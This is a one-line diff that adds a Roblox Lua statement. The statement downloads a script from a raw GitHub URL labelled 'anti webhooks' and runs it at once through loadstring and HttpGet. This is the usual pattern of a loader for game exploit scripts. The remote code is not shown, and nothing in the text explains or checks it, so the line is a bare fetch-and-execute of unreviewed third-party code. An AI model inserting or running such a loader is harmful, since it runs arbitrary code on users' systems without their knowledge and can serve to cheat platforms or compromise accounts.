@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jadpy/suki/refs/heads/main/anti%20webhooks"))()
